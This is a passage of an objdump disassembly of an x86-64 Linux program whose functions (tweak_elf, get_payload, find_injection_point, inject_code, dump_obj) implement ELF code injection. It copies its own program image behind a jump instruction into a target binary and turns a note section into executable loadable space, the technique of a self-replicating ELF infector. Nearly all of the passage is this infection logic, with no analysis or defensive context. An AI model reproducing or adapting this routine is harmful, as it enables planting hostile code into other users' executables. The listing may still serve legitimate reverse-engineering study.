    1df7:	48 c1 e0 06          	shl    $0x6,%rax
    1dfb:	48 89 c2             	mov    %rax,%rdx
    1dfe:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1e02:	48 01 d0             	add    %rdx,%rax
    1e05:	8b 40 04             	mov    0x4(%rax),%eax
    1e08:	83 f8 07             	cmp    $0x7,%eax
    1e0b:	0f 85 1a 01 00 00    	jne    1f2b <tweak_elf+0x496>
    1e11:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1e14:	48 98                	cltq   
    1e16:	48 c1 e0 06          	shl    $0x6,%rax
    1e1a:	48 89 c2             	mov    %rax,%rdx
    1e1d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1e21:	48 01 d0             	add    %rdx,%rax
    1e24:	8b 00                	mov    (%rax),%eax
    1e26:	89 c2                	mov    %eax,%edx
    1e28:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1e2c:	48 01 d0             	add    %rdx,%rax
    1e2f:	48 8d 15 d0 22 00 00 	lea    0x22d0(%rip),%rdx        # 4106 <_IO_stdin_used+0x106>
    1e36:	48 89 d6             	mov    %rdx,%rsi
    1e39:	48 89 c7             	mov    %rax,%rdi
    1e3c:	ff 15 5e 41 00 00    	call   *0x415e(%rip)        # 5fa0 <strcmp@GLIBC_2.2.5>
    1e42:	85 c0                	test   %eax,%eax
    1e44:	0f 85 e1 00 00 00    	jne    1f2b <tweak_elf+0x496>
    1e4a:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1e4d:	48 98                	cltq   
    1e4f:	48 c1 e0 06          	shl    $0x6,%rax
    1e53:	48 89 c2             	mov    %rax,%rdx
    1e56:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1e5a:	48 01 d0             	add    %rdx,%rax
    1e5d:	48 8b 40 18          	mov    0x18(%rax),%rax
    1e61:	48 89 c6             	mov    %rax,%rsi
    1e64:	48 8d 05 ad 22 00 00 	lea    0x22ad(%rip),%rax        # 4118 <_IO_stdin_used+0x118>
    1e6b:	48 89 c7             	mov    %rax,%rdi
    1e6e:	b8 00 00 00 00       	mov    $0x0,%eax
    1e73:	ff 15 0f 41 00 00    	call   *0x410f(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    1e79:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1e7c:	48 98                	cltq   
    1e7e:	48 c1 e0 06          	shl    $0x6,%rax
    1e82:	48 89 c2             	mov    %rax,%rdx
    1e85:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1e89:	48 01 d0             	add    %rdx,%rax
    1e8c:	c7 40 04 01 00 00 00 	movl   $0x1,0x4(%rax)
    1e93:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1e97:	8b 50 44             	mov    0x44(%rax),%edx
    1e9a:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1e9d:	48 98                	cltq   
    1e9f:	48 c1 e0 06          	shl    $0x6,%rax
    1ea3:	48 89 c1             	mov    %rax,%rcx
    1ea6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1eaa:	48 01 c8             	add    %rcx,%rax
    1ead:	89 d2                	mov    %edx,%edx
    1eaf:	48 89 50 18          	mov    %rdx,0x18(%rax)
    1eb3:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1eb7:	8b 50 48             	mov    0x48(%rax),%edx
    1eba:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1ebd:	48 98                	cltq   
    1ebf:	48 c1 e0 06          	shl    $0x6,%rax
    1ec3:	48 89 c1             	mov    %rax,%rcx
    1ec6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1eca:	48 01 c8             	add    %rcx,%rax
    1ecd:	89 d2                	mov    %edx,%edx
    1ecf:	48 89 50 10          	mov    %rdx,0x10(%rax)
    1ed3:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1ed6:	48 98                	cltq   
    1ed8:	48 c1 e0 06          	shl    $0x6,%rax
    1edc:	48 89 c2             	mov    %rax,%rdx
    1edf:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1ee3:	48 01 c2             	add    %rax,%rdx
    1ee6:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1eea:	48 8b 40 28          	mov    0x28(%rax),%rax
    1eee:	48 89 42 20          	mov    %rax,0x20(%rdx)
    1ef2:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1ef5:	48 98                	cltq   
    1ef7:	48 c1 e0 06          	shl    $0x6,%rax
    1efb:	48 89 c2             	mov    %rax,%rdx
    1efe:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1f02:	48 01 d0             	add    %rdx,%rax
    1f05:	48 c7 40 08 06 00 00 	movq   $0x6,0x8(%rax)
    1f0c:	00 
    1f0d:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1f10:	48 98                	cltq   
    1f12:	48 c1 e0 06          	shl    $0x6,%rax
    1f16:	48 89 c2             	mov    %rax,%rdx
    1f19:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1f1d:	48 01 d0             	add    %rdx,%rax
    1f20:	48 c7 40 30 10 00 00 	movq   $0x10,0x30(%rax)
    1f27:	00 
    1f28:	90                   	nop
    1f29:	eb 10                	jmp    1f3b <tweak_elf+0x4a6>
    1f2b:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
    1f2f:	8b 45 f8             	mov    -0x8(%rbp),%eax
    1f32:	3b 45 ec             	cmp    -0x14(%rbp),%eax
    1f35:	0f 8c b7 fe ff ff    	jl     1df2 <tweak_elf+0x35d>
    1f3b:	90                   	nop
    1f3c:	c9                   	leave  
    1f3d:	c3                   	ret    

0000000000001f3e <get_payload>:
    1f3e:	f3 0f 1e fa          	endbr64 
    1f42:	55                   	push   %rbp
    1f43:	48 89 e5             	mov    %rsp,%rbp
    1f46:	48 83 ec 20          	sub    $0x20,%rsp
    1f4a:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1f4e:	48 8d 05 40 f5 ff ff 	lea    -0xac0(%rip),%rax        # 1495 <main>
    1f55:	48 89 c2             	mov    %rax,%rdx
    1f58:	48 8d 05 a1 e0 ff ff 	lea    -0x1f5f(%rip),%rax        # 0 <__executable_start>
    1f5f:	48 89 c1             	mov    %rax,%rcx
    1f62:	48 89 d0             	mov    %rdx,%rax
    1f65:	48 29 c8             	sub    %rcx,%rax
    1f68:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1f6c:	48 8d 05 a5 40 00 00 	lea    0x40a5(%rip),%rax        # 6018 <_end>
    1f73:	48 89 c2             	mov    %rax,%rdx
    1f76:	48 8d 05 83 e0 ff ff 	lea    -0x1f7d(%rip),%rax        # 0 <__executable_start>
    1f7d:	48 89 c1             	mov    %rax,%rcx
    1f80:	48 89 d0             	mov    %rdx,%rax
    1f83:	48 29 c8             	sub    %rcx,%rax
    1f86:	48 89 c2             	mov    %rax,%rdx
    1f89:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1f8d:	48 89 50 28          	mov    %rdx,0x28(%rax)
    1f91:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1f95:	48 8b 40 28          	mov    0x28(%rax),%rax
    1f99:	48 83 c0 10          	add    $0x10,%rax
    1f9d:	48 89 c7             	mov    %rax,%rdi
    1fa0:	ff 15 1a 40 00 00    	call   *0x401a(%rip)        # 5fc0 <malloc@GLIBC_2.2.5>
    1fa6:	48 89 c2             	mov    %rax,%rdx
    1fa9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1fad:	48 89 50 20          	mov    %rdx,0x20(%rax)
    1fb1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1fb5:	48 8b 40 20          	mov    0x20(%rax),%rax
    1fb9:	48 85 c0             	test   %rax,%rax
    1fbc:	75 1a                	jne    1fd8 <get_payload+0x9a>
    1fbe:	48 8d 05 8c 21 00 00 	lea    0x218c(%rip),%rax        # 4151 <_IO_stdin_used+0x151>
    1fc5:	48 89 c7             	mov    %rax,%rdi
    1fc8:	ff 15 92 3f 00 00    	call   *0x3f92(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    1fce:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    1fd3:	e9 aa 00 00 00       	jmp    2082 <get_payload+0x144>
    1fd8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1fdc:	48 8b 40 28          	mov    0x28(%rax),%rax
    1fe0:	48 8d 50 10          	lea    0x10(%rax),%rdx
    1fe4:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1fe8:	48 8b 40 20          	mov    0x20(%rax),%rax
    1fec:	be 00 00 00 00       	mov    $0x0,%esi
    1ff1:	48 89 c7             	mov    %rax,%rdi
    1ff4:	ff 15 96 3f 00 00    	call   *0x3f96(%rip)        # 5f90 <memset@GLIBC_2.2.5>
    1ffa:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1ffe:	48 8b 40 20          	mov    0x20(%rax),%rax
    2002:	c6 00 e9             	movb   $0xe9,(%rax)
    2005:	48 83 45 f8 0b       	addq   $0xb,-0x8(%rbp)
    200a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    200e:	88 45 f7             	mov    %al,-0x9(%rbp)
    2011:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2015:	c1 e8 08             	shr    $0x8,%eax
    2018:	88 45 f6             	mov    %al,-0xa(%rbp)
    201b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    201f:	48 8b 40 20          	mov    0x20(%rax),%rax
    2023:	48 8d 50 02          	lea    0x2(%rax),%rdx
    2027:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
    202b:	88 02                	mov    %al,(%rdx)
    202d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2031:	48 8b 40 20          	mov    0x20(%rax),%rax
    2035:	48 8d 50 01          	lea    0x1(%rax),%rdx
    2039:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
    203d:	88 02                	mov    %al,(%rdx)
    203f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2043:	48 8b 40 28          	mov    0x28(%rax),%rax
    2047:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    204b:	48 8b 52 20          	mov    0x20(%rdx),%rdx
    204f:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
    2053:	48 89 c2             	mov    %rax,%rdx
    2056:	48 8d 05 a3 df ff ff 	lea    -0x205d(%rip),%rax        # 0 <__executable_start>
    205d:	48 89 c6             	mov    %rax,%rsi
    2060:	48 89 cf             	mov    %rcx,%rdi
    2063:	ff 15 47 3f 00 00    	call   *0x3f47(%rip)        # 5fb0 <memcpy@GLIBC_2.14>
    2069:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    206d:	48 8b 40 28          	mov    0x28(%rax),%rax
    2071:	48 8d 50 10          	lea    0x10(%rax),%rdx
    2075:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2079:	48 89 50 28          	mov    %rdx,0x28(%rax)
    207d:	b8 00 00 00 00       	mov    $0x0,%eax
    2082:	c9                   	leave  
    2083:	c3                   	ret    

0000000000002084 <handle_obj>:
    2084:	f3 0f 1e fa          	endbr64 
    2088:	55                   	push   %rbp
    2089:	48 89 e5             	mov    %rsp,%rbp
    208c:	48 83 ec 10          	sub    $0x10,%rsp
    2090:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2094:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2098:	48 89 c7             	mov    %rax,%rdi
    209b:	e8 9e fe ff ff       	call   1f3e <get_payload>
    20a0:	85 c0                	test   %eax,%eax
    20a2:	74 0a                	je     20ae <handle_obj+0x2a>
    20a4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    20a9:	e9 7d 01 00 00       	jmp    222b <handle_obj+0x1a7>
    20ae:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20b2:	48 89 c7             	mov    %rax,%rdi
    20b5:	e8 dd f5 ff ff       	call   1697 <find_injection_point>
    20ba:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20be:	8b 40 44             	mov    0x44(%rax),%eax
    20c1:	89 c2                	mov    %eax,%edx
    20c3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20c7:	48 8b 40 28          	mov    0x28(%rax),%rax
    20cb:	48 01 c2             	add    %rax,%rdx
    20ce:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20d2:	8b 40 38             	mov    0x38(%rax),%eax
    20d5:	89 c0                	mov    %eax,%eax
    20d7:	48 39 c2             	cmp    %rax,%rdx
    20da:	76 18                	jbe    20f4 <handle_obj+0x70>
    20dc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20e0:	8b 50 44             	mov    0x44(%rax),%edx
    20e3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20e7:	48 8b 40 28          	mov    0x28(%rax),%rax
    20eb:	01 c2                	add    %eax,%edx
    20ed:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20f1:	89 50 3c             	mov    %edx,0x3c(%rax)
    20f4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20f8:	8b 40 3c             	mov    0x3c(%rax),%eax
    20fb:	83 c0 01             	add    $0x1,%eax
    20fe:	89 c0                	mov    %eax,%eax
    2100:	48 89 c7             	mov    %rax,%rdi
    2103:	ff 15 b7 3e 00 00    	call   *0x3eb7(%rip)        # 5fc0 <malloc@GLIBC_2.2.5>
    2109:	48 89 c2             	mov    %rax,%rdx
    210c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2110:	48 89 50 10          	mov    %rdx,0x10(%rax)
    2114:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2118:	48 8b 40 10          	mov    0x10(%rax),%rax
    211c:	48 85 c0             	test   %rax,%rax
    211f:	75 1a                	jne    213b <handle_obj+0xb7>
    2121:	48 8d 05 46 20 00 00 	lea    0x2046(%rip),%rax        # 416e <_IO_stdin_used+0x16e>
    2128:	48 89 c7             	mov    %rax,%rdi
    212b:	ff 15 2f 3e 00 00    	call   *0x3e2f(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    2131:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2136:	e9 f0 00 00 00       	jmp    222b <handle_obj+0x1a7>
    213b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    213f:	8b 40 3c             	mov    0x3c(%rax),%eax
    2142:	83 c0 01             	add    $0x1,%eax
    2145:	89 c2                	mov    %eax,%edx
    2147:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    214b:	48 8b 40 10          	mov    0x10(%rax),%rax
    214f:	be 00 00 00 00       	mov    $0x0,%esi
    2154:	48 89 c7             	mov    %rax,%rdi
    2157:	ff 15 33 3e 00 00    	call   *0x3e33(%rip)        # 5f90 <memset@GLIBC_2.2.5>
    215d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2161:	8b 40 38             	mov    0x38(%rax),%eax
    2164:	89 c2                	mov    %eax,%edx
    2166:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    216a:	48 8b 08             	mov    (%rax),%rcx
    216d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2171:	48 8b 40 10          	mov    0x10(%rax),%rax
    2175:	48 89 ce             	mov    %rcx,%rsi
    2178:	48 89 c7             	mov    %rax,%rdi
    217b:	ff 15 2f 3e 00 00    	call   *0x3e2f(%rip)        # 5fb0 <memcpy@GLIBC_2.14>
    2181:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2185:	48 89 c7             	mov    %rax,%rdi
    2188:	e8 08 f9 ff ff       	call   1a95 <tweak_elf>
    218d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2191:	48 89 c7             	mov    %rax,%rdi
    2194:	e8 6b f4 ff ff       	call   1604 <inject_code>
    2199:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    219d:	48 89 c7             	mov    %rax,%rdi
    21a0:	67 e8 19 05 00 00    	addr32 call 26bf <dump_obj>
    21a6:	85 c0                	test   %eax,%eax
    21a8:	74 17                	je     21c1 <handle_obj+0x13d>
    21aa:	48 8d 05 da 1f 00 00 	lea    0x1fda(%rip),%rax        # 418b <_IO_stdin_used+0x18b>
    21b1:	48 89 c7             	mov    %rax,%rdi
    21b4:	ff 15 a6 3d 00 00    	call   *0x3da6(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    21ba:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    21bf:	eb 6a                	jmp    222b <handle_obj+0x1a7>
    21c1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    21c5:	8b 40 50             	mov    0x50(%rax),%eax
    21c8:	89 c6                	mov    %eax,%esi
    21ca:	48 8d 05 d4 1f 00 00 	lea    0x1fd4(%rip),%rax        # 41a5 <_IO_stdin_used+0x1a5>
    21d1:	48 89 c7             	mov    %rax,%rdi
    21d4:	b8 00 00 00 00       	mov    $0x0,%eax
    21d9:	ff 15 a9 3d 00 00    	call   *0x3da9(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    21df:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    21e3:	8b 50 48             	mov    0x48(%rax),%edx
    21e6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    21ea:	8b 40 4c             	mov    0x4c(%rax),%eax
    21ed:	01 d0                	add    %edx,%eax
    21ef:	89 c6                	mov    %eax,%esi
    21f1:	48 8d 05 c9 1f 00 00 	lea    0x1fc9(%rip),%rax        # 41c1 <_IO_stdin_used+0x1c1>
    21f8:	48 89 c7             	mov    %rax,%rdi
    21fb:	b8 00 00 00 00       	mov    $0x0,%eax
    2200:	ff 15 82 3d 00 00    	call   *0x3d82(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2206:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    220a:	48 8b 40 28          	mov    0x28(%rax),%rax
    220e:	48 89 c6             	mov    %rax,%rsi
    2211:	48 8d 05 c5 1f 00 00 	lea    0x1fc5(%rip),%rax        # 41dd <_IO_stdin_used+0x1dd>
    2218:	48 89 c7             	mov    %rax,%rdi
    221b:	b8 00 00 00 00       	mov    $0x0,%eax
    2220:	ff 15 62 3d 00 00    	call   *0x3d62(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2226:	b8 00 00 00 00       	mov    $0x0,%eax
    222b:	c9                   	leave  
    222c:	c3                   	ret    

000000000000222d <read_obj>:
    222d:	f3 0f 1e fa          	endbr64 
    2231:	55                   	push   %rbp
    2232:	48 89 e5             	mov    %rsp,%rbp
    2235:	53                   	push   %rbx
    2236:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
    223d:	48 89 bd 48 ff ff ff 	mov    %rdi,-0xb8(%rbp)
    2244:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    224b:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    2252:	48 8b 40 08          	mov    0x8(%rax),%rax
    2256:	be 00 00 00 00       	mov    $0x0,%esi
    225b:	48 89 c7             	mov    %rax,%rdi
    225e:	b8 00 00 00 00       	mov    $0x0,%eax
    2263:	ff 15 6f 3d 00 00    	call   *0x3d6f(%rip)        # 5fd8 <open@GLIBC_2.2.5>
    2269:	89 45 e8             	mov    %eax,-0x18(%rbp)
    226c:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
    2270:	79 2d                	jns    229f <read_obj+0x72>
    2272:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    2279:	48 8b 40 08          	mov    0x8(%rax),%rax
    227d:	48 89 c6             	mov    %rax,%rsi
    2280:	48 8d 05 6f 1f 00 00 	lea    0x1f6f(%rip),%rax        # 41f6 <_IO_stdin_used+0x1f6>
    2287:	48 89 c7             	mov    %rax,%rdi
    228a:	b8 00 00 00 00       	mov    $0x0,%eax
    228f:	ff 15 f3 3c 00 00    	call   *0x3cf3(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2295:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    229a:	e9 31 02 00 00       	jmp    24d0 <read_obj+0x2a3>
    229f:	48 8d 95 50 ff ff ff 	lea    -0xb0(%rbp),%rdx
    22a6:	8b 45 e8             	mov    -0x18(%rbp),%eax
    22a9:	48 89 d6             	mov    %rdx,%rsi
    22ac:	89 c7                	mov    %eax,%edi
    22ae:	ff 15 3c 3d 00 00    	call   *0x3d3c(%rip)        # 5ff0 <fstat@GLIBC_2.33>
    22b4:	85 c0                	test   %eax,%eax
    22b6:	79 15                	jns    22cd <read_obj+0xa0>
    22b8:	48 8d 05 53 1f 00 00 	lea    0x1f53(%rip),%rax        # 4212 <_IO_stdin_used+0x212>
    22bf:	48 89 c7             	mov    %rax,%rdi
    22c2:	ff 15 98 3c 00 00    	call   *0x3c98(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    22c8:	e9 00 02 00 00       	jmp    24cd <read_obj+0x2a0>
    22cd:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    22d3:	25 00 f0 00 00       	and    $0xf000,%eax
    22d8:	3d 00 80 00 00       	cmp    $0x8000,%eax
    22dd:	74 39                	je     2318 <read_obj+0xeb>
    22df:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    22e5:	25 00 f0 00 00       	and    $0xf000,%eax
    22ea:	3d 00 a0 00 00       	cmp    $0xa000,%eax
    22ef:	74 27                	je     2318 <read_obj+0xeb>
    22f1:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    22f7:	25 00 f0 00 00       	and    $0xf000,%eax
    22fc:	3d 00 c0 00 00       	cmp    $0xc000,%eax
    2301:	74 15                	je     2318 <read_obj+0xeb>
    2303:	48 8d 05 1b 1f 00 00 	lea    0x1f1b(%rip),%rax        # 4225 <_IO_stdin_used+0x225>
    230a:	48 89 c7             	mov    %rax,%rdi
    230d:	ff 15 4d 3c 00 00    	call   *0x3c4d(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    2313:	e9 b5 01 00 00       	jmp    24cd <read_obj+0x2a0>
    2318:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    231c:	48 85 c0             	test   %rax,%rax
    231f:	7f 15                	jg     2336 <read_obj+0x109>
    2321:	48 8d 05 16 1f 00 00 	lea    0x1f16(%rip),%rax        # 423e <_IO_stdin_used+0x23e>
    2328:	48 89 c7             	mov    %rax,%rdi
    232b:	ff 15 2f 3c 00 00    	call   *0x3c2f(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    2331:	e9 97 01 00 00       	jmp    24cd <read_obj+0x2a0>
    2336:	8b 9d 6c ff ff ff    	mov    -0x94(%rbp),%ebx
    233c:	ff 15 36 3c 00 00    	call   *0x3c36(%rip)        # 5f78 <getuid@GLIBC_2.2.5>
    2342:	39 c3                	cmp    %eax,%ebx
    2344:	75 0d                	jne    2353 <read_obj+0x126>
    2346:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    234c:	83 e0 40             	and    $0x40,%eax
    234f:	85 c0                	test   %eax,%eax
    2351:	74 2a                	je     237d <read_obj+0x150>
    2353:	8b 9d 70 ff ff ff    	mov    -0x90(%rbp),%ebx
    2359:	ff 15 59 3c 00 00    	call   *0x3c59(%rip)        # 5fb8 <getgid@GLIBC_2.2.5>
    235f:	39 c3                	cmp    %eax,%ebx
    2361:	75 0d                	jne    2370 <read_obj+0x143>
    2363:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    2369:	83 e0 08             	and    $0x8,%eax
    236c:	85 c0                	test   %eax,%eax
    236e:	74 0d                	je     237d <read_obj+0x150>
    2370:	8b 85 68 ff ff ff    	mov    -0x98(%rbp),%eax
    2376:	83 e0 01             	and    $0x1,%eax
    2379:	85 c0                	test   %eax,%eax
    237b:	75 15                	jne    2392 <read_obj+0x165>
    237d:	48 8d 05 d4 1e 00 00 	lea    0x1ed4(%rip),%rax        # 4258 <_IO_stdin_used+0x258>
    2384:	48 89 c7             	mov    %rax,%rdi
    2387:	ff 15 d3 3b 00 00    	call   *0x3bd3(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    238d:	e9 3b 01 00 00       	jmp    24cd <read_obj+0x2a0>
    2392:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    2396:	48 89 c6             	mov    %rax,%rsi
    2399:	8b 45 e8             	mov    -0x18(%rbp),%eax
    239c:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    23a2:	41 89 c0             	mov    %eax,%r8d
    23a5:	b9 02 00 00 00       	mov    $0x2,%ecx
    23aa:	ba 01 00 00 00       	mov    $0x1,%edx
    23af:	bf 00 00 00 00       	mov    $0x0,%edi
    23b4:	ff 15 c6 3b 00 00    	call   *0x3bc6(%rip)        # 5f80 <mmap@GLIBC_2.2.5>
    23ba:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    23be:	48 83 7d e0 ff       	cmpq   $0xffffffffffffffff,-0x20(%rbp)
    23c3:	75 38                	jne    23fd <read_obj+0x1d0>
    23c5:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    23cc:	48 8b 40 08          	mov    0x8(%rax),%rax
    23d0:	48 89 c6             	mov    %rax,%rsi
    23d3:	48 8d 05 b1 1e 00 00 	lea    0x1eb1(%rip),%rax        # 428b <_IO_stdin_used+0x28b>
    23da:	48 89 c7             	mov    %rax,%rdi
    23dd:	b8 00 00 00 00       	mov    $0x0,%eax
    23e2:	ff 15 a0 3b 00 00    	call   *0x3ba0(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    23e8:	8b 45 e8             	mov    -0x18(%rbp),%eax
    23eb:	89 c7                	mov    %eax,%edi
    23ed:	ff 15 a5 3b 00 00    	call   *0x3ba5(%rip)        # 5f98 <close@GLIBC_2.2.5>
    23f3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    23f8:	e9 d3 00 00 00       	jmp    24d0 <read_obj+0x2a3>
    23fd:	8b 45 e8             	mov    -0x18(%rbp),%eax
    2400:	89 c7                	mov    %eax,%edi
    2402:	ff 15 90 3b 00 00    	call   *0x3b90(%rip)        # 5f98 <close@GLIBC_2.2.5>
    2408:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    240f:	48 8b 50 08          	mov    0x8(%rax),%rdx
    2413:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    2417:	48 89 c1             	mov    %rax,%rcx
    241a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    241e:	48 89 ce             	mov    %rcx,%rsi
    2421:	48 89 c7             	mov    %rax,%rdi
    2424:	67 e8 26 03 00 00    	addr32 call 2750 <check_corruption>
    242a:	85 c0                	test   %eax,%eax
    242c:	75 66                	jne    2494 <read_obj+0x267>
    242e:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    2435:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2439:	48 89 10             	mov    %rdx,(%rax)
    243c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    2440:	89 c2                	mov    %eax,%edx
    2442:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    2449:	89 50 38             	mov    %edx,0x38(%rax)
    244c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    2450:	89 c2                	mov    %eax,%edx
    2452:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    2459:	89 50 3c             	mov    %edx,0x3c(%rax)
    245c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2460:	48 83 c0 05          	add    $0x5,%rax
    2464:	0f b6 00             	movzbl (%rax),%eax
    2467:	3c 01                	cmp    $0x1,%al
    2469:	0f 94 c0             	sete   %al
    246c:	89 c2                	mov    %eax,%edx
    246e:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    2475:	88 50 5c             	mov    %dl,0x5c(%rax)
    2478:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
    247f:	48 89 c7             	mov    %rax,%rdi
    2482:	e8 fd fb ff ff       	call   2084 <handle_obj>
    2487:	85 c0                	test   %eax,%eax
    2489:	74 10                	je     249b <read_obj+0x26e>
    248b:	c7 45 ec ff ff ff ff 	movl   $0xffffffff,-0x14(%rbp)
    2492:	eb 07                	jmp    249b <read_obj+0x26e>
    2494:	c7 45 ec ff ff ff ff 	movl   $0xffffffff,-0x14(%rbp)
    249b:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    249f:	48 89 c2             	mov    %rax,%rdx
    24a2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    24a6:	48 89 d6             	mov    %rdx,%rsi
    24a9:	48 89 c7             	mov    %rax,%rdi
    24ac:	ff 15 16 3b 00 00    	call   *0x3b16(%rip)        # 5fc8 <munmap@GLIBC_2.2.5>
    24b2:	85 c0                	test   %eax,%eax
    24b4:	79 17                	jns    24cd <read_obj+0x2a0>
    24b6:	48 8d 05 e6 1d 00 00 	lea    0x1de6(%rip),%rax        # 42a3 <_IO_stdin_used+0x2a3>
    24bd:	48 89 c7             	mov    %rax,%rdi
    24c0:	ff 15 9a 3a 00 00    	call   *0x3a9a(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    24c6:	c7 45 ec ff ff ff ff 	movl   $0xffffffff,-0x14(%rbp)
    24cd:	8b 45 ec             	mov    -0x14(%rbp),%eax
    24d0:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    24d4:	c9                   	leave  
    24d5:	c3                   	ret    

00000000000024d6 <ft_swap_32>:
    24d6:	f3 0f 1e fa          	endbr64 
    24da:	55                   	push   %rbp
    24db:	48 89 e5             	mov    %rsp,%rbp
    24de:	89 7d fc             	mov    %edi,-0x4(%rbp)
    24e1:	8b 45 fc             	mov    -0x4(%rbp),%eax
